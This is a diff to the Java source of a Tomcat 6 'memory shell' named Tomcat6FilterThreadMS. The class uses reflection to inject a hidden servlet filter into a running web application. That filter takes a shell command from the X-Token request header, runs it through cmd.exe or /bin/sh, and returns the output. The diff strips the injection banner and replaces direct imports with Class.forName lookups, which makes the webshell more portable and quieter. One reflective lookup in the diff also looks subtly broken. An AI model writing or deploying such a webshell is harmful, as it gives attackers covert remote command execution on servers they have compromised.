@@ -1,9 +1,5 @@
 package com.demo.memshell;
 
-import org.apache.catalina.Context;
-import org.apache.catalina.core.ApplicationContext;
-import org.apache.catalina.core.ApplicationFilterConfig;
-
 import javax.servlet.*;
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
@@ -19,10 +15,12 @@ import java.util.Properties;
  * Tomcat 6
  * Ref: https://flowerwind.github.io/2021/10/11/tomcat6%E3%80%817%E3%80%818%E3%80%819%E5%86%85%E5%AD%98%E9%A9%AC/
  */
+// todo 改id
 public class Tomcat6FilterThreadMS implements Filter {
 
-    final private static String NAME = "Whoopsunix";
-    final private static String pattern = "/WhoopsunixShell";
+    private static String NAME = "TomcatServletThreadMS";
+    private static String pattern = "/WhoopsunixShell";
+    private static String header = "X-Token";
     private static HttpServletRequest request;
     private static HttpServletResponse response;
 
@@ -72,7 +70,7 @@ public class Tomcat6FilterThreadMS implements Filter {
             Object standardContext;
             try {
                 ServletContext servletContext = (ServletContext) request.getClass().getDeclaredMethod("getServletContext").invoke(request);
-                ApplicationContext applicationContext = (ApplicationContext) getFieldValue(servletContext, "context");
+                Object applicationContext = getFieldValue(servletContext, "context");
                 standardContext = getFieldValue(applicationContext, "context");
             } catch (NoSuchMethodException e) {
                 standardContext = getFieldValue(request, "context");
@@ -101,13 +99,19 @@ public class Tomcat6FilterThreadMS implements Filter {
                 Properties properties = new Properties();
                 properties.put("org.apache.catalina.ssi.SSIFilter", "123");
 
-                Field restrictedFiltersField = ApplicationFilterConfig.class.getDeclaredField("restrictedFilters");
+//                Field restrictedFiltersField = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredField("restrictedFilters");
+//                restrictedFiltersField.setAccessible(true);
+//                restrictedFiltersField.set(null, properties);
+                Object ApplicationFilterConfigClass = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
+                // SerialVersionUID
+                setFieldValue(ApplicationFilterConfigClass, "serialVersionUID", 8434878928390042976L);
+                Field restrictedFiltersField = ApplicationFilterConfigClass.getClass().getDeclaredField("restrictedFilters");
                 restrictedFiltersField.setAccessible(true);
                 restrictedFiltersField.set(null, properties);
 
-                Constructor applicationFilterConfigConstructor = org.apache.catalina.core.ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, filterDef.getClass());
+                Constructor applicationFilterConfigConstructor = Class.forName("org.apache.catalina.core.ApplicationFilterConfig").getDeclaredConstructor(Class.forName("org.apache.catalina.Context"), filterDef.getClass());
                 applicationFilterConfigConstructor.setAccessible(true);
-                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) applicationFilterConfigConstructor.newInstance(standardContext, tmpFilterDef);
+                Object filterConfig = applicationFilterConfigConstructor.newInstance(standardContext, tmpFilterDef);
                 setFieldValue(filterConfig, "filter", tfmsThread);
                 setFieldValue(filterConfig, "filterDef", filterDef);
 
@@ -115,6 +119,7 @@ public class Tomcat6FilterThreadMS implements Filter {
                 filterConfigs.put(NAME, filterConfig);
             }
         } catch (Exception e) {
+            e.printStackTrace();
         }
     }
 
@@ -127,13 +132,12 @@ public class Tomcat6FilterThreadMS implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) {
         try {
             HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
-            String header = httpServletRequest.getHeader("X-Token");
-            if (header == null) {
+            String cmd = httpServletRequest.getHeader(header);
+            if (cmd == null) {
                 return;
             }
-            String result = exec(header);
+            String result = exec(cmd);
             PrintWriter printWriter = servletResponse.getWriter();
-            printWriter.println("Tomcat6FilterThreadMS injected");
             printWriter.println(result);
         } catch (Exception e) {
 
@@ -149,7 +153,7 @@ public class Tomcat6FilterThreadMS implements Filter {
     public static String exec(String str) {
         try {
             String[] cmd = null;
-            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                 cmd = new String[]{"cmd.exe", "/c", str};
             } else {
                 cmd = new String[]{"/bin/sh", "-c", str};
@@ -179,12 +183,12 @@ public class Tomcat6FilterThreadMS implements Filter {
         }
     }
 
-    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
-        final Field field = getField(obj.getClass(), fieldName);
+    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
+        Field field = getField(obj.getClass(), fieldName);
         return field.get(obj);
     }
 
-    public static Field getField(final Class<?> clazz, final String fieldName) {
+    public static Field getField(Class<?> clazz, String fieldName) {
         Field field = null;
         try {
             field = clazz.getDeclaredField(fieldName);
@@ -196,8 +200,8 @@ public class Tomcat6FilterThreadMS implements Filter {
         return field;
     }
 
-    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
-        final Field field = getField(obj.getClass(), fieldName);
+    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
+        Field field = getField(obj.getClass(), fieldName);
         field.set(obj, value);
     }
 }
